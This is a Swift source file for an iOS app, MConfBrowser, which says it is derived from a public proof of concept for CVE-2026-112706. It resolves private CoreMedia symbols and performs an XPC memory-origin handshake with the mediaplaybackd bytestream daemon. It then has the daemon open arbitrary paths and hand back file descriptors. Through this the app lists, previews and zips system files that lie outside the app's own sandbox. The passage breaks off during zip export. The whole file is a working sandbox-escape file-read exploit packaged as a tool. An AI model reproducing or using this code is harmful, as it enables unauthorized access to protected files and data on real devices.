//
//  ContentView.swift
//  MConfBrowser
//
//  Read-only filesystem browser over the CoreMedia bytestream primitive
//  (CVE-2026-112706). Derived from MConfPoC by ceoca69 (GPL-3.0):
//  https://github.com/ceoca69/wwdxwd
//
//  What it can do: list directories, preview files and export files or whole
//  directories as a zip — but ONLY for paths that mediaserverd's sandbox
//  allows. Anything else fails silently or with "denied", exactly like the
//  original PoC. This app never writes or deletes anything outside its own
//  Documents folder, and it never modifies the system.
//
//  NOTE: the XPC handshake / probe / directory-walk code below is adapted
//  from MConfPoC and kept intentionally close to the original, because that
//  code is proven to work on iOS 27.0.1. Only the UI and the one-level
//  listing / capped preview are new.
//

import Foundation
import SwiftUI
import UIKit
import Darwin
import CoreFoundation

// MARK: - Logging

private let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
private var logFd: Int32 = -1

private func resetSessionLogFile() {
    let path = docs.appendingPathComponent("run.log").path
    let fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0o644)
    if fd >= 0 { close(fd) }
}

private func openLog() {
    if logFd >= 0 { close(logFd); logFd = -1 }
    let path = docs.appendingPathComponent("run.log").path
    logFd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0o644)
}

private final class EHBox {
    var desc = ""
    var seen = false
}

private final class ProgressStats {
    var totalBytes: Int64 = 0
}

private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
    guard let pointer else { return }
    Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
}

// MARK: - Browser model

private enum BrowserAction {
    case list       // one-level directory listing
    case preview    // capped read of a single file (max 256 KB)
    case exportFile // full single file -> Documents + share sheet
    case exportZip  // recursive directory -> zip in Documents + share sheet
}

private struct BrowserEntry: Identifiable {
    enum Kind {
        case directory
        case file
        case other
    }
    let id = UUID()
    let name: String
    let kind: Kind
    let size: Int64 // -1 when unknown
}

private let previewCap: Int64 = 256 * 1024

private func outputFilename(for targetPath: String) -> String {
    let name = URL(fileURLWithPath: targetPath).lastPathComponent
    let safeName = name.isEmpty || name == "/" ? "target.bin" : name
    return safeName
}

private func joinPath(_ base: String, _ name: String) -> String {
    base.hasSuffix("/") ? base + name : base + "/" + name
}

private func formatSize(_ size: Int64) -> String {
    if size < 0 { return "—" }
    if size < 1024 { return "\(size) بايت" }
    if size < 1024 * 1024 { return String(format: "%.1f KB", Double(size) / 1024.0) }
    return String(format: "%.1f MB", Double(size) / (1024.0 * 1024.0))
}

private struct ActivityView: UIViewControllerRepresentable {
    let activityItems: [Any]

    func makeUIViewController(context: Context) -> UIActivityViewController {
        UIActivityViewController(activityItems: activityItems, applicationActivities: nil)
    }

    func updateUIViewController(_ controller: UIActivityViewController, context: Context) {}
}

// MARK: - Browser UI

struct ContentView: View {
    @State private var status = "جاهز — اضغط «تحديث» لعرض المجلد"
    @State private var isBusy = false
    @State private var currentPath = "/System/Library/"
    @State private var pathInput = "/System/Library/"
    @State private var navStack: [String] = []
    @State private var entries: [BrowserEntry] = []
    @State private var logs: [String] = []
    @State private var previewTitle = ""
    @State private var previewPath = ""
    @State private var previewText: String? = nil
    @State private var previewInfo = ""
    @State private var showPreview = false
    @State private var showExport = false
    @State private var resultURL: URL? = nil
    @State private var didResetSessionLog = false

    private let panelColor = Color(uiColor: .secondarySystemBackground)
    private let panelShape = RoundedRectangle(cornerRadius: 20, style: .continuous)

    var body: some View {
        VStack(alignment: .leading, spacing: 12) {
            VStack(alignment: .leading, spacing: 6) {
                Text("MConfBrowser")
                    .font(.headline)
                Text(status)
                    .font(.system(.footnote, design: .monospaced))
                    .foregroundStyle(.secondary)
                Text("قراءة فقط — ضمن نطاق ساندبوكس mediaserverd")
                    .font(.footnote)
                    .foregroundStyle(.secondary)
            }

            // Path bar
            HStack(spacing: 8) {
                TextField("Enter target path", text: $pathInput)
                    .font(.system(.body, design: .monospaced))
                    .textInputAutocapitalization(.never)
                    .autocorrectionDisabled()
                    .textFieldStyle(.plain)
                    .padding(.horizontal, 14)
                    .padding(.vertical, 12)
                    .background(panelColor)
                    .clipShape(panelShape)
                    .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
                Button("اذهب") { goToTypedPath() }
                    .buttonStyle(.plain)
                    .padding(.horizontal, 16)
                    .padding(.vertical, 12)
                    .background(Color(uiColor: .systemBlue), in: panelShape)
                    .foregroundStyle(.white)
                    .disabled(isBusy)
            }

            // Navigation + current path
            HStack(spacing: 8) {
                Button {
                    goBack()
                } label: {
                    Label("رجوع", systemImage: "chevron.backward")
                        .font(.body.weight(.medium))
                }
                .buttonStyle(.plain)
                .padding(.horizontal, 12)
                .padding(.vertical, 8)
                .background(panelColor, in: RoundedRectangle(cornerRadius: 12, style: .continuous))
                .disabled(isBusy || navStack.isEmpty)
                .opacity(navStack.isEmpty ? 0.45 : 1)
                Text(currentPath)
                    .font(.system(.footnote, design: .monospaced))
                    .lineLimit(1)
                    .truncationMode(.middle)
            }

            // Actions
            HStack(spacing: 8) {
                Button("تحديث") { runList(path: currentPath) }
                    .buttonStyle(.plain)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 12)
                    .background(Color(uiColor: .systemBlue), in: panelShape)
                    .foregroundStyle(.white)
                    .disabled(isBusy)
                Button("تصدير Zip") { runExportZip(path: currentPath) }
                    .buttonStyle(.plain)
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 12)
                    .background(panelColor, in: panelShape)
                    .disabled(isBusy)
            }

            // Entries
            if entries.isEmpty {
                Text("لا توجد عناصر — اضغط «تحديث» أو جرّب مسارًا آخر.")
                    .font(.footnote)
                    .foregroundStyle(.secondary)
                    .frame(maxWidth: .infinity, alignment: .center)
                    .padding(.vertical, 20)
            }
            ScrollView {
                VStack(alignment: .leading, spacing: 4) {
                    ForEach(entries) { entry in
                        Button {
                            openEntry(entry)
                        } label: {
                            HStack(spacing: 10) {
                                Image(systemName: entry.kind == .directory ? "folder.fill"
                                    : entry.kind == .file ? "doc.fill" : "link")
                                    .foregroundStyle(entry.kind == .directory ? Color.yellow : Color.secondary)
                                Text(entry.name)
                                    .font(.system(.callout, design: .monospaced))
                                    .lineLimit(1)
                                    .truncationMode(.middle)
                                Spacer()
                                if entry.kind == .file {
                                    Text(formatSize(entry.size))
                                        .font(.caption)
                                        .foregroundStyle(.secondary)
                                } else if entry.kind == .directory {
                                    Image(systemName: "chevron.forward")
                                        .font(.caption)
                                        .foregroundStyle(.secondary)
                                }
                            }
                            .padding(.horizontal, 12)
                            .padding(.vertical, 10)
                            .background(panelColor)
                            .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
                        }
                        .buttonStyle(.plain)
                        .disabled(isBusy || entry.kind == .other)
                    }
                }
            }
            .frame(maxWidth: .infinity, maxHeight: .infinity)

            // Log
            HStack {
                Text("Run Log")
                    .font(.headline)
                    .foregroundStyle(.secondary)
                Spacer()
                Button("مسح", role: .destructive) {
                    logs.removeAll()
                    resetSessionLogFile()
                }
                .disabled(isBusy)
            }
            ScrollViewReader { proxy in
                ScrollView {
                    VStack(alignment: .leading, spacing: 5) {
                        ForEach(Array(logs.enumerated()), id: \.offset) { index, line in
                            Text(line)
                                .font(.system(.caption, design: .monospaced))
                                .frame(maxWidth: .infinity, alignment: .leading)
                                .id(index)
                        }
                    }
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(12)
                }
                .onChange(of: logs.count) { _ in
                    if let lastIndex = logs.indices.last {
                        proxy.scrollTo(lastIndex, anchor: .bottom)
                    }
                }
            }
            .frame(maxWidth: .infinity, maxHeight: 140)
            .background(panelColor)
            .clipShape(panelShape)
            .overlay(panelShape.stroke(Color.white.opacity(0.07), lineWidth: 1))
        }
        .padding(.horizontal)
        .padding(.top, 60)
        .padding(.bottom, 8)
        .background(Color.black.ignoresSafeArea())
        .preferredColorScheme(.dark)
        .onAppear {
            guard !didResetSessionLog else { return }
            resetSessionLogFile()
            didResetSessionLog = true
            runList(path: currentPath)
        }
        .sheet(isPresented: $showPreview) {
            VStack(alignment: .leading, spacing: 12) {
                Text(previewTitle)
                    .font(.headline)
                    .padding(.horizontal)
                    .padding(.top, 16)
                if let previewText = previewText {
                    ScrollView {
                        Text(previewText)
                            .font(.system(.caption, design: .monospaced))
                            .frame(maxWidth: .infinity, alignment: .leading)
                            .padding(.horizontal)
                    }
                } else {
                    Text(previewInfo)
                        .font(.body)
                        .foregroundStyle(.secondary)
                        .padding(.horizontal)
                    Spacer()
                }
                Button("تصدير الملف كاملًا") {
                    showPreview = false
                    runExportFile(path: previewPath)
                }
                .buttonStyle(.plain)
                .frame(maxWidth: .infinity)
                .padding(.vertical, 14)
                .background(Color(uiColor: .systemBlue), in: panelShape)
                .foregroundStyle(.white)
                .padding(.horizontal)
                .padding(.bottom, 16)
            }
        }
        .sheet(isPresented: $showExport) {
            if let resultURL = resultURL {
                ActivityView(activityItems: [resultURL])
            }
        }
    }

    // MARK: - Navigation helpers

    private func goBack() {
        guard let prev = navStack.popLast() else { return }
        currentPath = prev
        pathInput = prev
        runList(path: prev)
    }

    private func goToTypedPath() {
        let typed = pathInput.trimmingCharacters(in: .whitespacesAndNewlines)
        guard typed.hasPrefix("/") else {
            status = "المسار لازم يبلش بـ /"
            return
        }
        navStack.removeAll()
        currentPath = typed
        runList(path: typed)
    }

    private func openEntry(_ entry: BrowserEntry) {
        if entry.kind == .directory {
            let next = joinPath(currentPath, entry.name)
            // Only commit the navigation after the listing succeeds.
            runList(path: next) {
                navStack.append(currentPath)
                currentPath = next
                pathInput = next
            }
        } else if entry.kind == .file {
            let filePath = joinPath(currentPath, entry.name)
            previewPath = filePath
            runPreview(path: filePath)
        }
    }

    // MARK: - Chain runners (each opens its own XPC connection)

    private func runList(path: String, onSuccess: (() -> Void)? = nil) {
        guard !isBusy else { return }
        isBusy = true
        status = "جارٍ عرض المجلد…"
        let trimmed = path.trimmingCharacters(in: .whitespacesAndNewlines)
        DispatchQueue.global(qos: .userInitiated).async {
            runChain(action: .list, targetPath: trimmed, onLog: { line in
                DispatchQueue.main.async { logs.append(line) }
            }, onEntries: { list in
                DispatchQueue.main.async {
                    entries = list
                    status = "تم عرض \(list.count) عنصر"
                    onSuccess?()
                }
            }, onListFailed: {
                DispatchQueue.main.async {
                    status = "تعذر فتح المجلد — غالبًا مرفوض من ساندبوكس الدايمون"
                }
            }, onPreview: { _, _ in }, onSaved: { _ in })
            DispatchQueue.main.async { isBusy = false }
        }
    }

    private func runPreview(path: String) {
        guard !isBusy else { return }
        isBusy = true
        status = "جارٍ قراءة الملف…"
        let trimmed = path.trimmingCharacters(in: .whitespacesAndNewlines)
        DispatchQueue.global(qos: .userInitiated).async {
            runChain(action: .preview, targetPath: trimmed, onLog: { line in
                DispatchQueue.main.async { logs.append(line) }
            }, onEntries: { _ in }, onListFailed: {}, onPreview: { data, fullSize in
                DispatchQueue.main.async {
                    previewTitle = URL(fileURLWithPath: trimmed).lastPathComponent
                    if let text = String(data: data, encoding: .utf8) {
                        previewText = text
                        if fullSize > Int64(data.count) {
                            previewText = text + "\n… (معاينة أول \(data.count) بايت من \(fullSize) بايت)"
                        }
                    } else {
                        previewText = nil
                        previewInfo = "ملف ثنائي — الحجم الكامل \(formatSize(fullSize)). صدّره لعرضه كاملًا."
                    }
                    status = "تمت قراءة المعاينة"
                    showPreview = true
                }
            }, onSaved: { _ in })
            DispatchQueue.main.async { isBusy = false }
        }
    }

    private func runExportFile(path: String) {
        guard !isBusy else { return }
        isBusy = true
        status = "جارٍ تصدير الملف…"
        let trimmed = path.trimmingCharacters(in: .whitespacesAndNewlines)
        DispatchQueue.global(qos: .userInitiated).async {
            runChain(action: .exportFile, targetPath: trimmed, onLog: { line in
                DispatchQueue.main.async { logs.append(line) }
            }, onEntries: { _ in }, onListFailed: {}, onPreview: { _, _ in }, onSaved: { url in
                DispatchQueue.main.async {
                    resultURL = url
                    status = "تم الحفظ — صدّر النتيجة"
                    showExport = true
                }
            })
            DispatchQueue.main.async { isBusy = false }
        }
    }

    private func runExportZip(path: String) {
        guard !isBusy else { return }
        isBusy = true
        status = "جارٍ تصدير Zip…"
        let trimmed = path.trimmingCharacters(in: .whitespacesAndNewlines)
        DispatchQueue.global(qos: .userInitiated).async {
            runChain(action: .exportZip, targetPath: trimmed, onLog: { line in
                DispatchQueue.main.async { logs.append(line) }
            }, onEntries: { _ in }, onListFailed: {}, onPreview: { _, _ in }, onSaved: { url in
                DispatchQueue.main.async {
                    resultURL = url
                    status = "تم الحفظ — صدّر النتيجة"
                    showExport = true
                }
            })
            DispatchQueue.main.async { isBusy = false }
        }
    }
}

// MARK: - The chain (adapted from MConfPoC, behavior unchanged)

private func runChain(action: BrowserAction, targetPath requestedPath: String,
                      onLog: @escaping (String) -> Void,
                      onEntries: @escaping ([BrowserEntry]) -> Void,
                      onListFailed: @escaping () -> Void,
                      onPreview: @escaping (Data, Int64) -> Void,
                      onSaved: @escaping (URL) -> Void) {
    openLog()
    defer { if logFd >= 0 { close(logFd); logFd = -1 } }
    func logLine(_ message: String) {
        let line = message + "\n"
        if logFd >= 0 { _ = line.withCString { write(logFd, $0, strlen($0)) } }
        onLog(message)
    }
    logLine("Run started")
    let dev = UIDevice.current
    logLine("Device: \(dev.model), iOS \(dev.systemVersion)")

    let targetPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
    guard !targetPath.isEmpty, targetPath.hasPrefix("/") else {
        logLine("Invalid target: enter an absolute file or directory path")
        if action == .list { onListFailed() }
        logLine("Run finished")
        return
    }
    let outputName = outputFilename(for: targetPath)
    logLine("Target: \(targetPath)")

    // Step 1 — resolve symbols.
    guard let cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL) else {
        logLine("CoreMedia load failed"); return
    }
    let rtld = UnsafeMutableRawPointer(bitPattern: -2)
    guard let pBasic = dlsym(cm, "FigXPCCreateBasicMessage"),
          let pBegin = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1"),
          let pComp  = dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2"),
          let pRecip = dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2"),
          let pSetURL = dlsym(cm, "FigXPCMessageSetCFURL"),
          let pConnCreate = dlsym(rtld, "xpc_connection_create_mach_service"),
          let pSetEH = dlsym(rtld, "xpc_connection_set_event_handler"),
          let pResume = dlsym(rtld, "xpc_connection_resume"),
          let pConnCancel = dlsym(rtld, "xpc_connection_cancel"),
          let pSendReply = dlsym(rtld, "xpc_connection_send_message_with_reply"),
          let pVal = dlsym(rtld, "xpc_dictionary_get_value"),
          let pU64 = dlsym(rtld, "xpc_dictionary_get_uint64"),
          let pSetU64 = dlsym(rtld, "xpc_dictionary_set_uint64"),
          let pDupFd = dlsym(rtld, "xpc_dictionary_dup_fd"),
          let pGetData = dlsym(rtld, "xpc_dictionary_get_data"),
          let pI64 = dlsym(rtld, "xpc_dictionary_get_int64"),
          let pSetI64 = dlsym(rtld, "xpc_dictionary_set_int64"),
          let pDesc = dlsym(rtld, "xpc_copy_description"),
          let pType = dlsym(rtld, "xpc_get_type"),
          let pTypeName = dlsym(rtld, "xpc_type_get_name"),
          let pRetain = dlsym(rtld, "xpc_retain"),
          let pRel = dlsym(rtld, "xpc_release") else {
        logLine("Required symbol missing"); return
    }

    typealias FBasic = @convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FBegin = @convention(c) (UnsafeMutableRawPointer?) -> Int32
    typealias FComp = @convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FRecip = @convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FSetURL = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32
    typealias FConnCreate = @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?
    typealias FSetEH = @convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FResume = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FConnCancel = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FSendReply = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FVal = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?
    typealias FU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
    typealias FSetU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
    typealias FDupFd = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
    typealias FGetData = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UnsafeMutablePointer<Int>?) -> UnsafeRawPointer?
    typealias FI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
    typealias FSetI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, Int64) -> Void
    typealias FDesc = @convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?
    typealias FType = @convention(c) (OpaquePointer?) -> OpaquePointer?
    typealias FTypeName = @convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?
    typealias FRetain = @convention(c) (OpaquePointer?) -> Void
    typealias FRel = @convention(c) (OpaquePointer?) -> Void

    let fBasic = unsafeBitCast(pBasic, to: FBasic.self)
    let fBegin = unsafeBitCast(pBegin, to: FBegin.self)
    let fComp = unsafeBitCast(pComp, to: FComp.self)
    let fRecip = unsafeBitCast(pRecip, to: FRecip.self)
    let fSetURL = unsafeBitCast(pSetURL, to: FSetURL.self)
    let fConnCreate = unsafeBitCast(pConnCreate, to: FConnCreate.self)
    let fSetEH = unsafeBitCast(pSetEH, to: FSetEH.self)
    let fResume = unsafeBitCast(pResume, to: FResume.self)
    let fConnCancel = unsafeBitCast(pConnCancel, to: FConnCancel.self)
    let fSendReply = unsafeBitCast(pSendReply, to: FSendReply.self)
    let fVal = unsafeBitCast(pVal, to: FVal.self)
    let fU64 = unsafeBitCast(pU64, to: FU64.self)
    let fSetU64 = unsafeBitCast(pSetU64, to: FSetU64.self)
    let fDupFd = unsafeBitCast(pDupFd, to: FDupFd.self)
    let fGetData = unsafeBitCast(pGetData, to: FGetData.self)
    let fI64 = unsafeBitCast(pI64, to: FI64.self)
    let fSetI64 = unsafeBitCast(pSetI64, to: FSetI64.self)
    let fDesc = unsafeBitCast(pDesc, to: FDesc.self)
    let fType = unsafeBitCast(pType, to: FType.self)
    let fTypeName = unsafeBitCast(pTypeName, to: FTypeName.self)
    let fRetain = unsafeBitCast(pRetain, to: FRetain.self)
    let fRel = unsafeBitCast(pRel, to: FRel.self)

    func desc(_ o: OpaquePointer?) -> String {
        guard let o = o, let c = fDesc(o) else { return "nil" }
        defer { free(c) }
        return String(cString: c).replacingOccurrences(of: "\n", with: " ")
    }
    func typeName(_ o: OpaquePointer?) -> String {
        guard let o = o, let t = fType(o), let n = fTypeName(t) else { return "?" }
        return String(cString: n)
    }

    // Step 2 — connect.
    guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({ fConnCreate($0, nil, 0) }) else {
        logLine("XPC connection failed"); return
    }
    let ehBox = EHBox()
    let eh: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
        guard let obj = obj else { return }
        ehBox.desc = "\(typeName(OpaquePointer(obj))): \(String(desc(OpaquePointer(obj)).prefix(200)))"
        ehBox.seen = true
    }
    fSetEH(conn, eh as AnyObject)
    fResume(conn)
    logLine("XPC connected")

    func send(_ m: UnsafeMutableRawPointer?) -> (OpaquePointer?, String) {
        guard let m = m else { return (nil, "nil") }
        let sem = DispatchSemaphore(value: 0)
        var out: OpaquePointer? = nil
        var tn = "?"
        let hb: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
            guard let obj = obj else { sem.signal(); return }
            tn = typeName(OpaquePointer(obj))
            if tn == "dictionary" || tn == "error" {
                fRetain(OpaquePointer(obj))
                out = OpaquePointer(obj)
            }
            sem.signal()
        }
        fSendReply(conn, m, nil, hb as AnyObject)
        if sem.wait(timeout: .now() + 8) != .success { return (nil, "timeout-8s") }
        return (out, tn)
    }

    // Step 3 — memory-origin handshake.
    var memoryRecipient: UnsafeMutableRawPointer? = nil
    var memoryOrigin: UnsafeMutableRawPointer? = nil

    var rp2Ready = false
    var handshakeReady = false

    var rp1Msg: UnsafeMutableRawPointer? = nil
    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {
        let (r1, t1) = send(m1)
        let replyDetail = (t1 == "error") ? " — \(desc(r1))" : ""
        logLine("Handshake 1: \(t1)\(replyDetail)")
        fRel(OpaquePointer(m1))

        if let r1 = r1, t1 == "dictionary" {
            var rp2Msg: UnsafeMutableRawPointer? = nil
            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {
                let cr = "mconf".withCString { fRecip(r1, m2, $0, &memoryRecipient) }
                logLine("Recipient creation: status=\(cr), object=\(memoryRecipient == nil ? "nil" : "present")")

                if cr == 0, memoryRecipient != nil {
                    let (r2, t2) = send(m2)
                    let replyDetail2 = (t2 == "error") ? " — \(desc(r2))" : ""
                    logLine("Handshake 2: \(t2)\(replyDetail2)")
                    rp2Ready = (t2 == "dictionary" && r2 != nil)
                    if let r2 = r2 { fRel(r2) }
                } else {
                    logLine("Handshake 2 skipped: memory recipient was not created")
                }
                fRel(OpaquePointer(m2))
            } else {
                logLine("Handshake 2 message creation failed")
            }
            fRel(r1)
        }
    } else {
        logLine("Handshake 1 message creation failed")
    }

    if rp2Ready {
        var orgMsg: UnsafeMutableRawPointer? = nil
        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {
            let bg = fBegin(om)
            logLine("Origin begin: status=\(bg)")
            if bg == 0 {
                let (or, ot) = send(om)
                let originReplyDetail = (ot == "error") ? " — \(desc(or))" : ""
                logLine("Origin: \(ot)\(originReplyDetail)")
                if let or = or {
                    if ot == "dictionary" {
                        let cp = fComp(or, &memoryOrigin)
                        handshakeReady = (cp == 0 && memoryOrigin != nil)
                        logLine("Origin established: \(handshakeReady ? "yes" : "no (status=\(cp))")")
                    } else {
                        logLine("Origin response was not a dictionary")
                    }
                    fRel(or)
                }
            } else {
                logLine("Origin begin failed; .org request skipped")
            }
            fRel(OpaquePointer(om))
        } else {
            logLine("Origin message creation failed")
        }
    } else {
        logLine("Origin handshake skipped: .rp1/.rp2 did not complete")
    }

    func directoryEntryName(_ entry: UnsafeMutablePointer<dirent>) -> String {
        let capacity = MemoryLayout.size(ofValue: entry.pointee.d_name)
        return withUnsafePointer(to: &entry.pointee.d_name) { namePointer in
            namePointer.withMemoryRebound(to: CChar.self, capacity: capacity) {
                String(cString: $0)
            }
        }
    }

    // Classify one directory entry (same logic as the original walk).
    func classifyEntry(name: String, dirFd: Int32, entry: UnsafeMutablePointer<dirent>) -> (BrowserEntry.Kind, Int64) {
        var itemStat = stat()
        let statResult = name.withCString {
            fstatat(dirFd, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
        }
        if statResult == 0 {
            let mode = itemStat.st_mode & mode_t(S_IFMT)
            if mode == mode_t(S_IFREG) {
                return (.file, Int64(itemStat.st_size))
            } else if mode == mode_t(S_IFDIR) {
                return (.directory, -1)
            }
            return (.other, -1)
        }
        let dType = entry.pointee.d_type
        if dType == UInt8(DT_REG) {
            return (.file, -1)
        } else if dType == UInt8(DT_DIR) || dType == 4 {
            return (.directory, -1)
        }
        return (.other, -1)
    }

    // Save one whole file to Documents (unchanged from the original).
    func saveFile(fd: Int32, outputName: String) {
        defer { close(fd) }
        var st = stat()
        guard fstat(fd, &st) == 0 else {
            logLine("fstat failed: errno=\(errno)")
            return
        }

        let size = Int64(st.st_size)
        guard size > 0 else {
            logLine("File \(outputName) is empty (\(size) bytes)")
            return
        }
        guard size <= Int64(Int.max) else {
            logLine("File \(outputName) is too large: \(size) bytes")
            return
        }
        var buffer = [UInt8](repeating: 0, count: Int(size))
        let count = pread(fd, &buffer, buffer.count, 0)
        guard count > 0 else {
            logLine("Read failed for \(outputName): errno=\(errno)")
            return
        }
        let output = docs.appendingPathComponent(outputName)
        do {
            try Data(buffer.prefix(count)).write(to: output, options: .atomic)
            logLine("Saved \(count) bytes: \(outputName)")
        } catch {
            logLine("Save failed for \(outputName): \(error.localizedDescription)")
        }
    }

    // Open one path through the daemon ("Curl" message, unchanged).
    func probe(_ path: String) -> Int32? {
        let cfURL = URL(fileURLWithPath: path) as CFURL
        var msg: UnsafeMutableRawPointer? = nil
        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {
            return nil
        }
        _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
        fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
        let (rp, rt) = send(m)
        fRel(OpaquePointer(m))
        guard rt == "dictionary", let rp = rp else {
            if let rp = rp { fRel(rp) }
            return nil
        }
        guard let details = fVal(rp, "ByteStreamDetails") else {
            fRel(rp)
            return nil
        }
        let oid = fU64(details, "ObjectID")
        let fd = fDupFd(details, "FileDescriptor")

        // Close the stream on the server side.
        var mD: UnsafeMutableRawPointer? = nil
        if fBasic(0x646f6f6d, oid, &mD) == 0, let mD = mD {
            let (rd, _) = send(mD)
            if let rd = rd { fRel(rd) }
            fRel(OpaquePointer(mD))
        }
        fRel(rp)

        return fd >= 0 ? fd : nil
    }

    // MARK: - Action dispatch

    if handshakeReady {
        logLine("Opening target path: \(targetPath)")
        if let initialFd = probe(targetPath) {
            var st = stat()
            if fstat(initialFd, &st) == 0 {
                let fileType = st.st_mode & mode_t(S_IFMT)
                if fileType == mode_t(S_IFDIR) {
                    switch action {
                    case .list:
                        close(initialFd)
                        // One-level listing (new): names come from readdir,
                        // so even entries we cannot open are still visible.
                        guard let dirFd = probe(targetPath) else {
                            logLine("Failed to open directory for listing.")
                            onListFailed()
                            break
                        }
                        defer { close(dirFd) }
                        guard let directory = fdopendir(dirFd) else {
                            logLine("fdopendir failed.")
                            onListFailed()
                            break
                        }
                        defer { closedir(directory) }
                        let directoryFD = dirfd(directory)
                        var found: [BrowserEntry] = []
                        while true {
                            errno = 0
                            guard let entry = readdir(directory) else { break }
                            let name = directoryEntryName(entry)
                            if name == "." || name == ".." { continue }
                            let (kind, size) = classifyEntry(name: name, dirFd: directoryFD, entry: entry)
                            found.append(BrowserEntry(name: name, kind: kind, size: size))
                        }
                        found.sort {
                            if $0.kind == .directory && $1.kind != .directory { return true }
                            if $0.kind != .directory && $1.kind == .directory { return false }
                            return $0.name.localizedCaseInsensitiveCompare($1.name) == .orderedAscending
                        }
                        logLine("Listed \(found.count) entries.")
                        onEntries(found)
                    case .exportZip:
                        close(initialFd)
                        logLine("Target is a directory.")
                        let tempDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
                        let rootFolderURL = tempDir.appendingPathComponent(outputName)

                        do {
                            try FileManager.default.createDirectory(at: rootFolderURL, withIntermediateDirectories: true)
                        } catch {
                            logLine("Failed to create temp directory: \(error.localizedDescription)")
                            break
                        }

                        let stats = ProgressStats()

                        // Recursive walk (unchanged from the original):
                        // entries that cannot be opened are skipped silently.
                        func processDirectory(remotePath: String, localDestinationDir: URL) {
                            guard let dirFd = probe(remotePath) else { return }
                            defer { close(dirFd) }

                            guard let directory = fdopendir(dirFd) else { return }
                            defer { closedir(directory) }

                            let directoryFD = dirfd(directory)

                            while true {
                                errno = 0
                                guard let entry = readdir(directory) else { break }
                                let name = directoryEntryName(entry)
                                if name == "." || name == ".." { continue }

                                var isDir = false
                                var isFile = false

                                var itemStat = stat()
                                let statResult = name.withCString {
                                    fstatat(directoryFD, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
                                }

                                if statResult == 0 {
                                    let mode = itemStat.st_mode & mode_t(S_IFMT)
                                    if mode == mode_t(S_IFREG) {
                                        isFile = true
                                    } else if mode == mode_t(S_IFDIR) {
                                        isDir = true
                                    }
                                } else {
                                    let dType = entry.pointee.d_type
                                    if dType == UInt8(DT_REG) {
                                        isFile = true
                                    } else if dType == UInt8(DT_DIR) || dType == 4 {
                                        isDir = true
                                    }
                                }

                                let childRemotePath = (remotePath.hasSuffix("/") ? remotePath : remotePath + "/") + name
                                let childLocalURL = localDestinationDir.appendingPathComponent(name)

                                if isFile {
                                    if let fileFd = probe(childRemotePath) {
                                        var stFile = stat()
                                        if fstat(fileFd, &stFile) == 0 {
                                            let size = Int64(stFile.st_size)
                                            if size > 0 && size <= Int64(Int.max) {
                                                var buffer = [UInt8](repeating: 0, count: Int(size))
                                                let count = pread(fileFd, &buffer, buffer.count, 0)
                                                if count > 0 {
                                                    do {
                                                        try FileManager.default.createDirectory(at: localDestinationDir, withIntermediateDirectories: true)
                                                        try Data(buffer.prefix(count)).write(to: childLocalURL, options: .atomic)
                                                        stats.totalBytes += Int64(count)
                                                    } catch {}
                                                }
                                            }
                                        }
                                        close(fileFd)
                                    }
                                } else if isDir {
                                    do {
                                        try FileManager.default.createDirectory(at: childLocalURL, withIntermediateDirectories: true)
                                    } catch {
                                        continue
                                    }
                                    processDirectory(remotePath: childRemotePath, localDestinationDir: childLocalURL)
                                }
                            }
                        }

                        processDirectory(remotePath: targetPath, localDestinationDir: rootFolderURL)

                        let zipFilename = outputName + ".zip"
                        let destinationZipURL = docs.appendingPathComponent(zipFilename)
                        try? FileManager.default.removeItem(at: destinationZipURL)

